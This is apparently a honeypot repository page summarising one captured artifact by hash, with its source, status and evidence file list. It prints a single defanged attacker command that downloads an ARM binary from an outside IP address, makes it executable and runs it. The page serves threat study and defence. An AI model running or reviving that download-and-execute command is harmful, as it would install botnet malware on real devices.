# 7e38d9092536eb9bbcb247bc5d2856cb942f5f721f735060824d5c6a365aa81d

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `7e38d9092536eb9bbcb247bc5d2856cb942f5f721f735060824d5c6a365aa81d` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
busybox wget hxxp://94[.]154[.]43[.]XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
